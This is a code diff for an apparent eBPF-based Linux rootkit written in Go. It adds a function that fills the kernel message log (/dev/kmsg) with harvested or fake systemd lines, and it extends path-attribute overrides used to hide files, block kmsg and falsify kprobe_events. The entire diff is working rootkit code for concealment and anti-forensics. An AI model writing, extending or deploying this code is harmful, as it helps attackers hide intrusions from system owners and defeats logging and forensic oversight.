@@ -1,10 +1,12 @@
 package hidden
 
 import (
+	"bufio"
 	"bytes"
 	"fmt"
 	"io"
 	"io/ioutil"
+	"log"
 	"os"
 	"path"
 	"path/filepath"
@@ -111,16 +113,18 @@ func (rk *RkHidden) PutFdContent(m *ebpf.Map, id uint64, reader io.Reader) {
 	}
 }
 
-func (rk *RkHidden) PutPathAttr(m *ebpf.Map, path string, attr RkPathAttr) {
+func (rk *RkHidden) PutPathAttr(m *ebpf.Map, path string, attr RkPathAttr, override bool) {
 	var zeroAttr RkPathAttr
 
 	for i, key := range RkPathKeys(path) {
 		if i == 0 {
-			prev, ok := rk.pathAttr[key]
-			if ok {
-				attr.Action = attr.Action | prev.Action
-				attr.ReturnValue = attr.ReturnValue | prev.ReturnValue
-				attr.HiddenHash = attr.HiddenHash | prev.HiddenHash
+			if !override {
+				prev, ok := rk.pathAttr[key]
+				if ok {
+					attr.Action = attr.Action | prev.Action
+					attr.ReturnValue = attr.ReturnValue | prev.ReturnValue
+					attr.HiddenHash = attr.HiddenHash | prev.HiddenHash
+				}
 			}
 
 			if err := m.Put(key.Bytes(), attr.Bytes()); err != nil {
@@ -162,7 +166,7 @@ func (rk *RkHidden) BlockKmsg() []RkFdKey {
 		FSType: "devtmpfs",
 		Action: OverrideReturn,
 	}
-	rk.PutPathAttr(pathKeysMap, "kmsg", attr)
+	rk.PutPathAttr(pathKeysMap, "kmsg", attr, true)
 
 	// send fake message to force the processes to read and to exit
 	rk.Kmsg("systemd[1]: Resync Network Time Service.")
@@ -193,7 +197,7 @@ func (rk *RkHidden) OverrideContent(fsType string, path string, reader io.Reader
 	}
 
 	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
-	rk.PutPathAttr(pathKeysMap, path, attr)
+	rk.PutPathAttr(pathKeysMap, path, attr, false)
 
 	contentsMap, _, _ := rk.MainManager.GetMap("rk_fd_contents")
 	rk.PutFdContent(contentsMap, id, reader)
@@ -207,7 +211,7 @@ func (rk *RkHidden) OverrideReturn(fsType string, path string, value int64) {
 	}
 
 	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
-	rk.PutPathAttr(pathKeysMap, path, attr)
+	rk.PutPathAttr(pathKeysMap, path, attr, false)
 }
 
 func (rk *RkHidden) HideFile(fsType string, dir string, file string) {
@@ -218,7 +222,7 @@ func (rk *RkHidden) HideFile(fsType string, dir string, file string) {
 	}
 
 	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
-	rk.PutPathAttr(pathKeysMap, dir, attr)
+	rk.PutPathAttr(pathKeysMap, dir, attr, false)
 
 	rk.OverrideReturn(fsType, path.Join(dir, file), -2)
 }
@@ -251,17 +255,76 @@ func (rk *RkHidden) HideMyself() {
 	}
 }
 
+func (rk *RkHidden) FillKmsg() {
+	file, err := os.Open("/dev/kmsg")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer file.Close()
+
+	var strs []string
+
+	scanner := bufio.NewScanner(file)
+	// optionally, resize scanner's capacity for lines over 64K, see next example
+	for scanner.Scan() {
+		els := strings.Split(scanner.Text(), ";")
+		if len(els) < 2 {
+			continue
+		}
+		txt := els[1]
+
+		if len(txt) >= 100 {
+			continue
+		}
+
+		if strings.Contains(txt, " port") ||
+			strings.Contains(txt, "IPV6") ||
+			strings.Contains(txt, " renamed") ||
+			strings.Contains(txt, "xfs") || strings.Contains(txt, "ext4") {
+			strs = append(strs, txt)
+		}
+
+		if len(strs) == 30 {
+			break
+		}
+	}
+
+	if len(strs) < 30 {
+		for i := 0; i != 30; i++ {
+			strs = append(strs, "systemd[1]: Reached target Sockets.")
+			if len(strs) == 30 {
+				break
+			}
+		}
+	}
+
+	kmsgMap, _, _ := rk.MainManager.GetMap("rk_kmsg")
+	for i, str := range strs {
+		k := make([]byte, 4)
+		ByteOrder.PutUint32(k, uint32(i))
+
+		d := make([]byte, 100)
+		copy(d[:], []byte(str))
+
+		if err := kmsgMap.Put(k, d); err != nil {
+			rk.HandleError(err)
+		}
+	}
+}
+
 func (rk *RkHidden) InitOverride() {
 	rkFilesMap, _, _ := rk.MainManager.GetMap("rk_files")
 	rkFdAttrsMap, _, _ := rk.MainManager.GetMap("rk_fd_attrs")
 	rkFdContentsMap, _, _ := rk.MainManager.GetMap("rk_fd_contents")
 	rkGetdentsMap, _, _ := rk.MainManager.GetMap("rk_getdents")
+	rkKmsgMap, _, _ := rk.MainManager.GetMap("rk_kmsg")
 
 	rk.Options.MapEditors = map[string]*ebpf.Map{
 		"rk_files":       rkFilesMap,
 		"rk_fd_attrs":    rkFdAttrsMap,
 		"rk_fd_contents": rkFdContentsMap,
 		"rk_getdents":    rkGetdentsMap,
+		"rk_kmsg":        rkKmsgMap,
 	}
 	rk.Options.TailCallRouter = []manager.TailCallRoute{
 		{
@@ -315,11 +378,12 @@ func (rk *RkHidden) InitOverride() {
 	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
 
 	// kmsg override
+	rk.FillKmsg()
 	attr := RkPathAttr{
 		FSType: "devtmpfs",
 		Action: KMsgProg,
 	}
-	rk.PutPathAttr(pathKeysMap, "kmsg", attr)
+	rk.PutPathAttr(pathKeysMap, "kmsg", attr, true)
 
 	// kprobe_events override
 	rk.OverrideContent("tracefs", "kprobe_events", bytes.NewReader(rk.KprobeEvents))
